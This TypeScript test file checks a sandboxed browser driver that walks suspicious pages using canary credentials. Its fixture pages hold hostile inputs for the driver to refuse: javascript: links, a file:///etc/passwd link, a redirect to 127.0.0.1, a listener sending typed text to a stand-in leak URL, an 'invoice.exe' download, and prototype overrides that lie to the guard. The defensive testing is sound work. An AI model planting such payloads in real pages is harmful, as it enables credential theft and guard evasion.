import { env } from "cloudflare:workers";
import puppeteer, { type Browser, type Page } from "@cloudflare/puppeteer";
import { afterEach, describe, expect, it, vi } from "vitest";
import { ulid } from "../../src/db/ulid";
import { readArtefact, type Store } from "../../src/intake/store";
import { Action, Driver, LIMITS } from "../../src/walkthrough/driver";
import type { Resolve } from "../../src/walkthrough/url-policy";

// D04 T02 §3: the contained walkthrough driver, on a real (local) Browser Run session. Every page is served through
// the stub `fetch` the driver is given, which stands in for the Worker's own `fetch`: a request that reached the
// network any other way would never be answered.
const store: Store = { bucket: env.ARTEFACTS, db: env.DB };
const canary = {
  username: "canary-0123456789ab@canary.isitlegit.co.za",
  password: "IsItLegit-Canary-0123456789ABCDEFGHJK",
};
const resolve: Resolve = async (name) =>
  name === "inner.example" ? ["10.0.0.5"] : name.endsWith(".example") ? ["93.184.215.14"] : null;

// The blob button names `window.URL`: inside an inline handler a bare `URL` is `document.URL`, a string.
const PAGE = `<!doctype html><html><head><link rel="stylesheet" href="/style.css"><script src="/app.js"></script></head>
<body style="margin:0">
<div id="box" style="position:absolute;left:0;top:0;width:200px;height:100px"
  onclick="this.dataset.n=(+(this.dataset.n||0))+1;this.style.background=['#c00','#0c0','#00c'][this.dataset.n%3]"
  ondblclick="window.dbl=(window.dbl||0)+1"></div>
<input id="user" style="position:absolute;left:0;top:120px;width:300px;height:30px">
<a href="javascript:window.jsran=true" style="position:absolute;left:0;top:200px;width:100px;height:20px;display:block">js</a>
<a href="file:///etc/passwd" style="position:absolute;left:0;top:240px;width:100px;height:20px;display:block">file</a>
<a href="/redirect-inner" style="position:absolute;left:0;top:280px;width:100px;height:20px;display:block">redirect</a>
<a href="/download" style="position:absolute;left:0;top:320px;width:100px;height:20px;display:block">download</a>
<a href="https://fixture.example/popup" target="_blank" style="position:absolute;left:0;top:360px;width:100px;height:20px;display:block">blank</a>
<button onclick="window.open('https://inner.example/x')" style="position:absolute;left:0;top:400px;width:100px;height:20px">open</button>
<a href="https://inner.example/" style="position:absolute;left:0;top:440px;width:100px;height:20px;display:block">inner</a>
<form action="javascript:window.formran=true" style="position:absolute;left:0;top:480px"><input id="search" style="width:200px;height:20px"></form>
<a href="/plain.txt" download style="position:absolute;left:0;top:520px;width:100px;height:20px;display:block">download attr</a>
<button onclick="const a=document.createElement('a');a.href=window.URL.createObjectURL(new Blob(['x']));a.download='made.exe';document.body.append(a);a.click()" style="position:absolute;left:0;top:560px;width:100px;height:20px">blob</button>
<button onclick="const w=window.open('');if(w)w.document.write('<p>written popup</p>')" style="position:absolute;left:0;top:600px;width:100px;height:20px">blank popup</button>
<iframe id="sframe" srcdoc="<a href='javascript:parent.frameran=true' style='display:block;width:200px;height:30px'>go</a>" style="position:absolute;left:400px;top:100px;width:300px;height:60px;border:0"></iframe>
<iframe src="https://other.example/frame" style="position:absolute;left:400px;top:200px;width:300px;height:60px;border:0"></iframe>
<form action="javascript:window.plainform=true" style="position:absolute;left:400px;top:300px;margin:0"><button id="plainbtn" style="width:100px;height:20px">Continue</button></form>
<div id="host" style="position:absolute;left:400px;top:380px;width:200px;height:30px"></div>
<button onclick="setTimeout(()=>window.open('https://fixture.example/popup'),400)" style="position:absolute;left:400px;top:440px;width:100px;height:20px">later</button>
<img src="https://inner.example/pixel.png" style="position:absolute;left:400px;top:0;width:1px;height:1px">
<div style="height:4000px"></div>
<form action="/safe" style="position:absolute;left:400px;top:480px;margin:0"><input id="implicit" style="width:100px;height:20px"><button formaction="javascript:window.implicitran=true" style="width:60px;height:20px">Go</button></form>
<script>const shadow=document.getElementById("host").attachShadow({mode:"closed"});shadow.innerHTML='<a href="javascript:window.shadowran=true" style="display:block;width:200px;height:30px">s</a>';
window.focusShadow=()=>shadow.querySelector("a").focus();
document.getElementById("user").addEventListener("input",(e)=>{new Image().src="https://inner.example/leak?p="+encodeURIComponent(e.target.value)});
window.keys=[];addEventListener("keydown",(e)=>keys.push(e.key));
addEventListener("mousemove",(e)=>{window.mx=e.clientX;window.my=e.clientY});
try{const w=new Worker(URL.createObjectURL(new Blob(["setInterval(()=>postMessage(1),20)"])));w.onmessage=()=>{window.ticks=(window.ticks||0)+1}}catch(e){window.workerRefused=String(e)}
try{const f=document.body.appendChild(document.createElement("iframe"));const W=f.contentWindow.Worker;const w=new W(URL.createObjectURL(new Blob(["setInterval(()=>postMessage(1),20)"])));w.onmessage=()=>{window.frameTicks=(window.frameTicks||0)+1}}catch(e){window.frameWorkerRefused=String(e)}
navigator.serviceWorker && navigator.serviceWorker.register("/sw.js").then(()=>{window.sw="registered"},()=>{window.sw="refused"});</script>
</body></html>`;

type Served = { asked: string[]; fetch: typeof fetch };
function site(options: { stall?: string } = {}): Served {
  const asked: string[] = [];
  const html = (body: string) => new Response(body, { headers: { "content-type": "text/html" } });
  // Like the Worker's `fetch`: a redirect is followed unless `redirect: "manual"` is asked for, so a driver that
  // let `fetch` follow would reach the redirect's target past the policy, and this log would show it.
  const fetcher = (async (input: RequestInfo | URL, init?: RequestInit): Promise<Response> => {
    const answer = await serve(input);
    const location = answer.headers.get("location");
    if (init?.redirect !== "manual" && answer.status >= 300 && answer.status < 400 && location)
      return fetcher(new URL(location, String(input)).href, init);
    return answer;
  }) as typeof fetch;
  const serve = async (input: RequestInfo | URL): Promise<Response> => {
    const url = new URL(String(input));
    asked.push(url.href);
    if (options.stall && url.pathname === options.stall) return new Promise(() => {});
    switch (url.pathname) {
      case "/":
        return html(PAGE);
      case "/style.css":
        return new Response("body{background:#fafafa}", { headers: { "content-type": "text/css" } });
      case "/app.js":
        return new Response("window.appLoaded=true", { headers: { "content-type": "text/javascript" } });
      case "/popup":
        // Slow, so a navigation the driver started outside an action would still be landing after the action returned.
        await new Promise((done) => setTimeout(done, 300));
        return html("<p>popup page</p>");
      case "/liar":
        // A page that lies to the guard: the link's own lookup, prototype getters and URL itself are replaced.
        return html(`<a id="liar" href="javascript:window.liarran=true" style="display:block;width:100px;height:20px">liar</a>
<form action="javascript:window.formliar=true" style="margin:0"><button id="fbtn" style="width:100px;height:20px">Go</button></form>
<script>const liar=document.getElementById("liar");liar.getAttribute=()=>"https://fixture.example/safe";
for (const [proto, name] of [[HTMLAnchorElement.prototype,"href"],[HTMLFormElement.prototype,"action"],[HTMLButtonElement.prototype,"formAction"]])
  Object.defineProperty(proto,name,{get:()=>"https://fixture.example/safe"});
Element.prototype.hasAttribute=()=>false;Element.prototype.getAttribute=()=>"https://fixture.example/safe";
window.URL=function(){return{href:"https://fixture.example/safe"}};</script>`);
      case "/swap":
        // Links whose address the page changes as the click begins, after the guard has read it.
        return html(`<a href="/safe" onmousedown="this.href='file:///etc/passwd'" style="display:block;width:100px;height:20px">f</a>
<a href="/safe" onmousedown="this.href='data:text/html,<p>data page</p>'" style="display:block;width:100px;height:20px">d</a>`);
      case "/poster":
        return html(
          `<script>setTimeout(() => fetch("https://slow.example/collect", { method: "POST", body: "x" }), 200)</script>`,
        );
      case "/frame":
        return html(`<a href="javascript:window.ran=true" style="display:block;width:200px;height:30px">go</a>`);
      case "/reloader":
        return html(`<p>${Date.now()}</p><script>setTimeout(() => location.reload(), 15)</script>`);
      case "/redirect-inner":
        return new Response(null, { status: 302, headers: { location: "http://127.0.0.1/" } });
      case "/plain.txt":
        return new Response("plain", { headers: { "content-type": "text/plain" } });
      case "/download":
        return new Response("MZ-not-a-real-exe", {
          headers: { "content-disposition": "attachment; filename=invoice.exe" },
        });
      case "/sw.js":
        return new Response("self.addEventListener('fetch',()=>{})", {
          headers: { "content-type": "text/javascript" },
        });
      default:
        return new Response("not found", { status: 404 });
    }
  };
  return { asked, fetch: fetcher };
}

let browser: Browser | undefined;
afterEach(async () => {
  if (browser?.connected) await browser.close();
  browser = undefined;
});

async function newCase() {
  const id = ulid();
  const now = new Date().toISOString();
  await env.DB.prepare(
    "INSERT INTO cases (id, org_id, channel, created_at, updated_at) VALUES (?, 'org-walk', 'email', ?, ?)",
  )
    .bind(id, now, now)
    .run();
  return id;
}

async function walk(
  options: {
    served?: Served;
    limits?: { steps: number; ms: number };
    startUrl?: string;
    store?: Store;
    resolve?: Resolve;
  } = {},
) {
  browser = await puppeteer.launch(env.BROWSER);
  const caseId = await newCase();
  const served = options.served ?? site();
  const driver = await Driver.open(browser, {
    caseId,
    walkId: "w1",
    canary,
    startUrl: options.startUrl ?? "https://fixture.example/",
    store: options.store ?? store,
    fetch: served.fetch,
    resolve: options.resolve ?? resolve,
    ...(options.limits ? { limits: options.limits } : {}),
  });
  return { driver, caseId, served, browser };
}

// Every page the browser has, as Chrome lists them: Puppeteer's own list leaves out a `noopener` popup it never attached.
const openPages = async (b: Browser) => {
  const cdp = await b.target().createCDPSession();
  const { targetInfos } = (await cdp.send("Target.getTargets")) as { targetInfos: { type: string }[] };
  await cdp.detach();
  return targetInfos.filter((t) => t.type === "page").length;
};
// The walk's page, made into a Page alone (a stray popup's Page cannot be made).
const walkPage = async (b: Browser): Promise<Page> => {
  const targets = b.targets().filter((t) => t.type() === "page");
  const page = await targets.find((t) => t.url().startsWith("https://fixture.example/"))?.page();
  if (!page) throw new Error(`no walk page among ${targets.map((t) => t.url()).join(", ")}`);
  return page;
};
const state = <T>(b: Browser, expression: string) => walkPage(b).then((p) => p.evaluate(expression) as Promise<T>);
// The walk's rows; the test page's refused service worker and image add `popup` and `request` rows at their own pace,
// so only actions and the end are returned unless every kind is asked for.
const rows = (caseId: string, every = false) =>
  env.DB.prepare(
    "SELECT seq, kind, action_json, outcome, reason, screenshot_key FROM walkthrough_actions WHERE case_id = ? ORDER BY seq",
  )
    .bind(caseId)
    .all<{
      seq: number;
      kind: string;
      action_json: string;
      outcome: string;
      reason: string | null;
      screenshot_key: string | null;
    }>()
    .then((r) => r.results.filter((row) => every || row.kind === "action" || row.kind === "end"));
const same = (a: Uint8Array | null, b: Uint8Array | null) =>
  !!a && !!b && a.length === b.length && a.every((x, i) => x === b[i]);

describe("Action and LIMITS", () => {
  it("pins the spec's limits and refuses actions out of bounds", () => {
    expect(LIMITS).toEqual({ steps: 8, ms: 60_000 });
    for (const bad of [
      { tool: "click", x: 1280, y: 0 },
      { tool: "click", x: -1, y: 0 },
      { tool: "scroll", direction: "down", amount: 11 },
      { tool: "wait", ms: 3001 },
      { tool: "keypress", key: "Control+V" },
      { tool: "keypress", key: "Meta+c" },
      { tool: "navigate", url: "https://x.example/" },
      { tool: "type", text: "x".repeat(201) },
      { tool: "click", x: 1, y: 1, extra: true },
    ])
      expect(Action.safeParse(bad).success, JSON.stringify(bad)).toBe(false);
  });
});

describe("Driver", { timeout: 120_000 }, () => {
  it("uses native Worker fetch without binding it to the options object", async () => {
    const transport = vi.fn(function (this: unknown) {
      // Native Worker fetch rejects a foreign receiver; injected arrow transports hid this boundary.
      if (this !== undefined && this !== globalThis) throw new TypeError("Illegal invocation");
      return Promise.resolve(
        new Response("<html><body>Receiver-safe page</body></html>", {
          headers: { "content-type": "text/html" },
        }),
      );
    });
    vi.stubGlobal("fetch", transport);
    try {
      browser = await puppeteer.launch(env.BROWSER);
      const driver = await Driver.open(browser, {
        caseId: await newCase(),
        walkId: "native-fetch-receiver",
        canary,
        startUrl: "https://fixture.example/",
        store,
        resolve,
      });
      expect(driver.ended).toBeUndefined();
      expect((await driver.view()).outcome).toBe("done");
      expect(await state(browser, "document.body.textContent")).toContain("Receiver-safe page");
      expect(transport).toHaveBeenCalled();
      await driver.close();
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it("loads the page and every subresource through the Worker's fetch", async () => {
    const { driver, served, browser: b } = await walk();
    expect(served.asked).toEqual(
      expect.arrayContaining([
        "https://fixture.example/",
        "https://fixture.example/style.css",
        "https://fixture.example/app.js",
      ]),
    );
    expect(await state(b, "window.appLoaded")).toBe(true);
    // The service worker's script is a request with no frame: refused, so the registration fails.
    expect(await state(b, "new Promise((r)=>setTimeout(()=>r(window.sw),500))")).toBe("refused");
    await driver.close();
  });

  it("runs click, double click, move and scroll with their effect on the page, a row and a screenshot each", async () => {
    const { driver, caseId, browser: b } = await walk();
    const first = await driver.execute({ tool: "screenshot" });
    const click = await driver.execute({ tool: "click", x: 50, y: 50 });
    expect(click.outcome).toBe("done");
    expect(await state(b, "document.getElementById('box').dataset.n")).toBe("1");
    expect(same(first.screenshot, click.screenshot)).toBe(false);
    expect((await driver.execute({ tool: "double_click", x: 50, y: 50 })).outcome).toBe("done");
    expect(await state(b, "window.dbl")).toBe(1);
    expect((await driver.execute({ tool: "move", x: 321, y: 123 })).outcome).toBe("done");
    expect(await state(b, "[window.mx, window.my]")).toEqual([321, 123]);
    const before = (await driver.execute({ tool: "screenshot" })).screenshot;
    const scrolled = await driver.execute({ tool: "scroll", direction: "down", amount: 3 });
    expect(scrolled.outcome).toBe("done");
    expect(await state<number>(b, "window.scrollY")).toBeGreaterThan(0);
    expect(same(before, scrolled.screenshot)).toBe(false);
    const logged = await rows(caseId);
    expect(logged.map((r) => r.kind)).toEqual(Array(6).fill("action"));
    for (const r of logged) {
      expect(r.screenshot_key).toMatch(new RegExp(`^art/${caseId}/page/`));
      const read = await readArtefact(store, caseId, r.screenshot_key ?? "");
      expect(read && "body" in read && read.body.length > 0).toBe(true);
    }
    await driver.close();
  });

  it("runs type, keypress and wait with their effect on the page", async () => {
    const { driver, caseId, browser: b } = await walk();
    await driver.execute({ tool: "click", x: 100, y: 135 });
    expect((await driver.execute({ tool: "type", text: canary.username })).outcome).toBe("done");
    expect(await state(b, "document.getElementById('user').value")).toBe(canary.username);
    expect((await driver.execute({ tool: "keypress", key: "Enter" })).outcome).toBe("done");
    expect(await state(b, "window.keys")).toContain("Enter");
    const began = Date.now();
    expect((await driver.execute({ tool: "wait", ms: 400 })).outcome).toBe("done");
    expect(Date.now() - began).toBeGreaterThanOrEqual(400);
    const logged = await rows(caseId);
    expect(JSON.parse(logged[1]?.action_json ?? "{}")).toEqual({ tool: "type", field: "username" });
    await driver.close();
  });

  it("stops the ninth attempt, refused ones counted, and closes the walk", async () => {
    const { driver, caseId, browser: b } = await walk();
    await driver.execute({ tool: "keypress", key: "Control+V" });
    for (let i = 0; i < 7; i++) expect((await driver.execute({ tool: "screenshot" })).outcome).toBe("done");
    expect(await driver.execute({ tool: "screenshot" })).toMatchObject({ outcome: "limit", reason: "steps" });
    const logged = await rows(caseId);
    expect(logged.map((r) => [r.kind, r.outcome])).toEqual([
      ["action", "refused"],
      ...Array.from({ length: 7 }, () => ["action", "done"]),
      ["action", "limit"],
      ["end", "limit"],
    ]);
    expect(logged.map((r) => r.seq)).toEqual([...logged.map((r) => r.seq)].sort((a, b) => a - b));
    expect(b.connected).toBe(false);
    expect(await driver.execute({ tool: "screenshot" })).toMatchObject({ outcome: "limit", reason: "steps" });
  });

  it("ends on the wall clock with nothing pending, cuts an action that crosses it, and bounds a stalled open", async () => {
    const idle = await walk({ limits: { steps: 8, ms: 3_000 } });
    await new Promise((r) => setTimeout(r, 3_600));
    expect(idle.driver.ended).toEqual({ outcome: "limit", reason: "time" });
    expect(idle.browser.connected).toBe(false);
    expect(await idle.driver.execute({ tool: "screenshot" })).toMatchObject({ outcome: "limit", reason: "time" });

    // The cut is proven from the wait's own timer, not a stopwatch (cut and teardown time varies with the runner): the
    // clock stops the 3000 ms timer before it runs, and the timer never completes.
    const set = globalThis.setTimeout;
    const clear = globalThis.clearTimeout;
    const waits = new Map<unknown, { cleared: boolean; ran: boolean }>();
    globalThis.setTimeout = ((fn: () => void, ms?: number) => {
      if (ms !== 3000) return set(fn, ms);
      const entry = { cleared: false, ran: false };
      const id = set(() => {
        entry.ran = true;
        fn();
      }, ms);
      waits.set(id, entry);
      return id;
    }) as typeof setTimeout;
    globalThis.clearTimeout = ((id?: Parameters<typeof clear>[0]) => {
      const entry = waits.get(id);
      if (entry) entry.cleared = true;
      return clear(id);
    }) as typeof clearTimeout;
    try {
      const crossing = await walk({ limits: { steps: 8, ms: 2_500 } });
      expect(await crossing.driver.execute({ tool: "wait", ms: 3000 })).toMatchObject({
        outcome: "limit",
        reason: "time",
      });
      await new Promise((r) => set(r, 800));
      expect([...waits.values()]).toEqual([{ cleared: true, ran: false }]);
    } finally {
      globalThis.setTimeout = set;
      globalThis.clearTimeout = clear;
    }

    const stalled = await walk({ served: site({ stall: "/" }), limits: { steps: 8, ms: 2_000 } });
    expect(stalled.driver.ended).toEqual({ outcome: "limit", reason: "time" });
    expect(stalled.browser.connected).toBe(false);
  });

  it("types only the canary values and keeps no typed text", async () => {
    const { driver, caseId, browser: b } = await walk();
    await driver.execute({ tool: "click", x: 100, y: 135 });
    expect(await driver.execute({ tool: "type", text: "john@company.co.za" })).toMatchObject({ outcome: "refused" });
    expect(await state(b, "document.getElementById('user').value")).toBe("");
    await driver.execute({ tool: "type", text: canary.password });
    const logged = await rows(caseId, true);
    const all = JSON.stringify(logged);
    expect(all).not.toContain("john@company.co.za");
    expect(all).not.toContain(canary.password);
    const typed = logged.filter((r) => r.action_json.includes('"type"')).map((r) => JSON.parse(r.action_json));
    expect(typed).toEqual([
      { tool: "type", length: 18 },
      { tool: "type", field: "password" },
    ]);
    await driver.close();
  });

  it("refuses links that would leave http(s), before clicking", async () => {
    const { driver, browser: b } = await walk();
    expect(await driver.execute({ tool: "click", x: 20, y: 210 })).toMatchObject({
      outcome: "refused",
      reason: expect.stringMatching(/javascript/),
    });
    expect(await state(b, "window.jsran")).toBeUndefined();
    expect(await driver.execute({ tool: "click", x: 20, y: 250 })).toMatchObject({
      outcome: "refused",
      reason: expect.stringMatching(/file/),
    });
    expect((await walkPage(b)).url()).toBe("https://fixture.example/");
    await driver.close();
  });

  it("refuses a redirect to a private address, a download and a link to an inner name, on every hop", async () => {
    const { driver, served, browser: b } = await walk();
    expect((await driver.execute({ tool: "click", x: 20, y: 290 })).reason).toMatch(/127\.0\.0\.1.*IP address/);
    expect((await walkPage(b)).url()).toBe("https://fixture.example/");
    expect((await driver.execute({ tool: "click", x: 20, y: 330 })).reason).toMatch(/download refused/);
    expect((await driver.execute({ tool: "click", x: 20, y: 450 })).reason).toMatch(/inner\.example.*non-public/);
    expect(served.asked.some((u) => u.includes("127.0.0.1") || u.includes("inner.example"))).toBe(false);
    await driver.close();
  });

  it("follows a target=_blank lure in the walk's page and refuses a popup to an inner address", async () => {
    const { driver, caseId, served, browser: b } = await walk();
    const opened = await openPages(b);
    await driver.execute({ tool: "click", x: 20, y: 370 });
    // The driver moves the walk's page only inside an action, never beside its screenshot: idle, it stays put.
    const after = (await walkPage(b)).url();
    await new Promise((done) => setTimeout(done, 500));
    expect((await walkPage(b)).url()).toBe(after);
    await driver.execute({ tool: "wait", ms: 800 });
    // The popup is closed: the browser has the pages it had before the click.
    expect(await openPages(b)).toBe(opened);
    expect((await walkPage(b)).url()).toBe("https://fixture.example/popup");
    const popups = (await rows(caseId, true)).filter((r) => r.kind === "popup" && r.action_json.includes("/popup"));
    expect(popups.map((r) => r.outcome)).toEqual(["done"]);
    await driver.close();

    const second = await walk();
    const before = await openPages(second.browser);
    await second.driver.execute({ tool: "click", x: 20, y: 410 });
    await second.driver.execute({ tool: "wait", ms: 800 });
    expect(await openPages(second.browser)).toBe(before);
    expect(
      (await rows(second.caseId, true)).some(
        (r) => r.kind === "popup" && r.outcome === "refused" && r.action_json.includes("inner.example"),
      ),
    ).toBe(true);
    expect(second.served.asked.some((u) => u.includes("inner.example"))).toBe(false);
    expect(served.asked.some((u) => u.includes("inner.example"))).toBe(false);
    await second.driver.close();
  });

  it("closes a popup that never navigates before the next action runs", async () => {
    const { driver, browser: b } = await walk();
    const opened = await openPages(b);
    await driver.execute({ tool: "click", x: 20, y: 610 });
    expect(await openPages(b)).toBe(opened + 1);
    await driver.execute({ tool: "screenshot" });
    expect(await openPages(b)).toBe(opened);
    await driver.close();
  });

  it("never holds an action to the wall clock on a page that keeps navigating itself", async () => {
    // Each reload commits a new document while the walk takes its screenshots.
    const { driver } = await walk({ startUrl: "https://fixture.example/reloader", limits: { steps: 12, ms: 40_000 } });
    for (let i = 0; i < 12; i++) {
      const began = Date.now();
      const answer = await driver.execute({ tool: "screenshot" });
      expect(answer.outcome).not.toBe("limit");
      expect(answer.outcome).toBe("done");
      expect(Date.now() - began).toBeLessThan(8_000);
    }
    await driver.close();
  });

  it("refuses a javascript: link in a frame, a cross-origin frame and a closed shadow root, and a plain submit of a javascript: form", async () => {
    const { driver, browser: b } = await walk();
    for (const [x, y] of [
      [420, 115],
      [420, 215],
      [420, 395],
      [420, 310],
    ] as const)
      expect(await driver.execute({ tool: "click", x, y }), `${x},${y}`).toMatchObject({ outcome: "refused" });
    expect(await state(b, "[window.frameran, window.shadowran, window.plainform]")).toEqual([null, null, null]);
    const other = (await walkPage(b)).frames().find((f) => f.url().startsWith("https://other.example/"));
    expect(await other?.evaluate("window.ran")).toBeUndefined();
    // Keyboard activation of the same targets: the plain submit button, and a link focused inside a frame.
    await (await walkPage(b)).focus("#plainbtn");
    expect(await driver.execute({ tool: "keypress", key: "Enter" })).toMatchObject({ outcome: "refused" });
    await state(b, `document.getElementById("sframe").contentDocument.querySelector("a").focus()`);
    expect(await driver.execute({ tool: "keypress", key: "Enter" })).toMatchObject({ outcome: "refused" });
    // A link focused inside a closed shadow root, and Enter in a field whose form's default button goes elsewhere.
    await state(b, "focusShadow()");
    expect(await driver.execute({ tool: "keypress", key: "Enter" })).toMatchObject({ outcome: "refused" });
    await (await walkPage(b)).focus("#implicit");
    expect(await driver.execute({ tool: "keypress", key: "Enter" })).toMatchObject({ outcome: "refused" });
    expect(await state(b, "[window.frameran, window.plainform, window.shadowran, window.implicitran]")).toEqual([
      null,
      null,
      null,
      null,
    ]);
    await driver.close();
  });

  it("is not fooled by a page that replaces the methods and getters the guard reads", async () => {
    const { driver, browser: b } = await walk({ startUrl: "https://fixture.example/liar" });
    const page = b.targets().find((t) => t.url().endsWith("/liar"));
    const p = await page?.page();
    if (!p) throw new Error("no liar page");
    expect(await driver.execute({ tool: "click", x: 20, y: 10 })).toMatchObject({ outcome: "refused" });
    expect(await driver.execute({ tool: "click", x: 20, y: 30 })).toMatchObject({ outcome: "refused" });
    await p.focus("#liar");
    expect(await driver.execute({ tool: "keypress", key: "Enter" })).toMatchObject({ outcome: "refused" });
    await p.focus("#fbtn");
    expect(await driver.execute({ tool: "keypress", key: "Enter" })).toMatchObject({ outcome: "refused" });
    expect(await p.evaluate("[window.liarran, window.formliar]")).toEqual([null, null]);
    await driver.close();
  });

  it("leaves the page where it was when a link switches to file: or data: as the click begins", async () => {
    // The guard reads the address before the click; a page can change it in its own mousedown. Chrome itself refuses a
    // page-started navigation to file: or data:, so the walk stays on the page.
    const { driver, browser: b } = await walk({ startUrl: "https://fixture.example/swap" });
    const at = () => b.targets().find((t) => t.type() === "page" && t.url().startsWith("https://fixture.example/swap"));
    for (const y of [10, 30]) {
      await driver.execute({ tool: "click", x: 20, y });
      await driver.execute({ tool: "wait", ms: 300 });
      expect(at(), String(y)).toBeDefined();
    }
    // The page did switch both links: the refusal above was Chrome's, not a click that missed.
    const swapped = await (await at()?.page())?.evaluate("Array.from(document.links, (a) => a.href.split(':')[0])");
    expect(swapped).toEqual(["file", "data"]);
    await driver.close();
  });

  it("sends nothing after the walk ends, not even a request whose name resolved late", async () => {
    let release: (() => void) | undefined;
    const held = new Promise<void>((done) => {
      release = done;
    });
    const slow: Resolve = async (name) => {
      if (name === "slow.example") {
        await held;
        return ["93.184.215.14"];
      }
      return resolve(name);
    };
    const { driver, served } = await walk({
      startUrl: "https://fixture.example/poster",
      resolve: slow,
      limits: { steps: 8, ms: 1_500 },
    });
    await new Promise((done) => setTimeout(done, 2_000));
    expect(driver.ended).toMatchObject({ outcome: "limit", reason: "time" });
    release?.();
    await new Promise((done) => setTimeout(done, 500));
    expect(served.asked.some((u) => u.includes("slow.example"))).toBe(false);
  });

  it("keeps no canary value in any row, even one the page put into a refused URL", async () => {
    const { driver, caseId } = await walk();
    await driver.execute({ tool: "click", x: 100, y: 135 });
    await driver.execute({ tool: "type", text: canary.password });
    await driver.execute({ tool: "wait", ms: 300 });
    const kept = await rows(caseId, true);
    const text = JSON.stringify(kept);
    expect(text).not.toContain(canary.password);
    expect(text).not.toContain(encodeURIComponent(canary.password));
    expect(kept.some((r) => r.kind === "request" && r.action_json.includes("[canary password]"))).toBe(true);
    await driver.close();
  });

  it("ends the walk when a refusal cannot be recorded", async () => {
    const noRequests = new Proxy(env.DB, {
      get(target, key) {
        if (key !== "prepare") return Reflect.get(target, key);
        return (sql: string) => {
          const statement = target.prepare(sql);
          if (!sql.includes("walkthrough_actions")) return statement;
          return {
            bind: (...values: unknown[]) =>
              values[3] === "request" ? { run: () => Promise.reject(new Error("D1 down")) } : statement.bind(...values),
          };
        };
      },
    }) as D1Database;
    const { driver, browser: b } = await walk({ store: { ...store, db: noRequests } });
    await new Promise((done) => setTimeout(done, 500));
    expect(driver.ended?.outcome).toBe("error");
    expect((await driver.execute({ tool: "screenshot" })).outcome).toBe("error");
    expect(b.connected).toBe(false);
  });

  it("runs nothing on a popup left pending: not on the ninth attempt, not for malformed input, not on stale coordinates", async () => {
    const limited = await walk({ limits: { steps: 1, ms: 20_000 } });
    await limited.driver.execute({ tool: "click", x: 420, y: 450 });
    await new Promise((done) => setTimeout(done, 900));
    expect(await limited.driver.execute({ tool: "screenshot" })).toMatchObject({ outcome: "limit", reason: "steps" });
    expect(limited.served.asked).not.toContain("https://fixture.example/popup");

    const { driver, served, browser: b } = await walk();
    await driver.execute({ tool: "click", x: 420, y: 450 });
    await new Promise((done) => setTimeout(done, 900));
    expect((await driver.execute({ tool: "nope" })).outcome).toBe("refused");
    expect(served.asked).not.toContain("https://fixture.example/popup");
    expect(await driver.execute({ tool: "click", x: 20, y: 20 })).toMatchObject({
      outcome: "refused",
      reason: expect.stringMatching(/popup was followed first/),
    });
    expect((await walkPage(b)).url()).toBe("https://fixture.example/popup");
    await driver.close();
  });

  it("records a refusal made while the page loads, before any action", async () => {
    const { driver, caseId } = await walk();
    const refused = (await rows(caseId, true)).filter((r) => r.kind === "request");
    expect(refused.some((r) => r.action_json.includes("inner.example/pixel.png") && r.outcome === "refused")).toBe(
      true,
    );
    await driver.close();
  });

  it("guards keyboard activation like a click: Enter on a javascript: link or in a javascript: form", async () => {
    const { driver, browser: b } = await walk();
    await driver.execute({ tool: "click", x: 100, y: 135 });
    expect((await driver.execute({ tool: "keypress", key: "Tab" })).outcome).toBe("done");
    expect(await state(b, "document.activeElement.href")).toMatch(/^javascript:/);
    expect(await driver.execute({ tool: "keypress", key: "Enter" })).toMatchObject({ outcome: "refused" });
    expect(await state(b, "window.jsran")).toBeUndefined();
    await driver.execute({ tool: "click", x: 50, y: 490 });
    expect(await driver.execute({ tool: "keypress", key: "Enter" })).toMatchObject({ outcome: "refused" });
    expect(await state(b, "window.formran")).toBeUndefined();
    await driver.close();
  });

  it("denies a download with no attachment header and a page-made one, and records each", async () => {
    // Each in a walk of its own: Chrome silently blocks a page's second automatic download before it begins.
    for (const [y, made] of [
      [530, "plain.txt"],
      [570, "blob:"],
    ] as const) {
      const { driver, caseId } = await walk();
      await driver.execute({ tool: "click", x: 20, y });
      // The refusal is written when the browser reports the download, which a slow machine does later: poll, bounded.
      const recorded = async () =>
        (await rows(caseId, true)).some(
          (r) => r.kind === "request" && r.reason === "download refused" && r.action_json.includes(made),
        );
      const deadline = Date.now() + 5_000;
      while (!(await recorded()) && Date.now() < deadline) await new Promise((done) => setTimeout(done, 100));
      expect(await recorded(), made).toBe(true);
      await driver.close();
    }
  });

  it("starts no worker, not even a Blob one", async () => {
    const { driver, browser: b } = await walk();
    await driver.execute({ tool: "wait", ms: 500 });
    expect(await state(b, "window.ticks")).toBeUndefined();
    expect(await state(b, "window.workerRefused")).toMatch(/Worker/);
    // A blank frame the page makes is a fresh window with its own constructor: no worker starts there either.
    expect(await state(b, "window.frameTicks")).toBeUndefined();
    await driver.close();
  });

  it("keeps a row for an attempt the clock cut short, and never answers done after the deadline", async () => {
    const crossing = await walk({ limits: { steps: 8, ms: 2_500 } });
    expect(await crossing.driver.execute({ tool: "wait", ms: 3000 })).toMatchObject({
      outcome: "limit",
      reason: "time",
    });
    expect((await rows(crossing.caseId)).map((r) => [r.kind, r.outcome, r.reason])).toEqual(
      expect.arrayContaining([["action", "limit", "time"]]),
    );
    // An audit write that finishes after the deadline: the answer is the limit, not done.
    let slow = false;
    const lateDb = new Proxy(env.DB, {
      get(target, key) {
        if (key !== "prepare") return Reflect.get(target, key);
        return (sql: string) => {
          const statement = target.prepare(sql);
          if (!slow || !sql.includes("walkthrough_actions")) return statement;
          return {
            bind: (...values: unknown[]) => {
              const bound = statement.bind(...values);
              return { run: () => new Promise((done) => setTimeout(() => done(bound.run()), 3_000)) };
            },
          };
        };
      },
    }) as D1Database;
    const late = await walk({ store: { ...store, db: lateDb }, limits: { steps: 8, ms: 2_500 } });
    slow = true;
    expect(await late.driver.execute({ tool: "screenshot" })).toMatchObject({ outcome: "limit", reason: "time" });
  });

  it("refuses a start URL the policy refuses, with no navigation", async () => {
    const { driver, caseId, served } = await walk({ startUrl: "http://127.0.0.1/" });
    expect(driver.ended?.outcome).toBe("refused");
    expect(served.asked).toEqual([]);
    expect((await rows(caseId, true)).map((r) => [r.kind, r.outcome])).toEqual([
      ["request", "refused"],
      ["end", "refused"],
    ]);
  });

  it("ends the same way on an R2, a D1, a page or an interception failure: everything closed, never done", async () => {
    const brokenBucket = {
      ...store,
      bucket: { put: () => Promise.reject(new Error("R2 down")) } as unknown as R2Bucket,
    };
    const r2 = await walk({ store: brokenBucket });
    expect((await r2.driver.execute({ tool: "screenshot" })).outcome).toBe("error");
    expect(r2.browser.connected).toBe(false);

